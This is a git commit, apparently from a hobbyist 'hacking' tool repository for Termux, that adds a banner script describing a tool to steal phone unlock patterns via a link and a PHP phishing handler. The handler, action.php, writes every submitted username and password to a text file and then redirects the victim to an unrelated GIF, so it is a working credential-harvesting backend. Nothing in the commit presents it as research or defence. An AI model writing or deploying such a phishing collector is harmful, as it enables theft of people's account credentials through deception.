32f7afd544eb682ed82f268f86f40124f4b7d75d
N17R0 <49580304+noob-hackers@users.noreply.github.com>
2020-04-10 09:52:39 +0530

    Add files via upload

---
+++ core/about/about.sh
@@ -0,0 +1,20 @@
+clear
+echo '                    
+            __   __     _____   __       __       _____    
+           /\_\ /_/\  /\_____\ /\_\     /\_\     ) ___ (   
+          ( ( (_) ) )( (_____/( ( (    ( ( (    / /\_/\ \  
+           \ \___/ /  \ \__\   \ \_\    \ \_\  / /_/ (_\ \ 
+           / / _ \ \  / /__/_  / / /__  / / /__\ \ )_/ / / 
+          ( (_( )_) )( (_____\( (_____(( (_____(\ \/_\/ /  
+           \/_/ \_\/  \/_____/ \/_____/ \/_____/ )_____(   
+                                                 
+' | lolcat
+echo " "
+echo "                             About"|lolcat
+echo " "
+echo "       🙏 Hey, there I am Nakeeb (Nitro), i made this tool
+  to penetrate pattern by link from termux, so i hope guys you
+                             liked it. 😘"
+echo ""
+echo "                  Our channel :- Noob Hackers"| lolcat
+echo " "
---
+++ core/pattern/action.php
@@ -0,0 +1,5 @@
+<?php
+
+file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://thumbs.gfycat.com/FewHonorableGrasshopper-size_restricted.gif');
+exit();
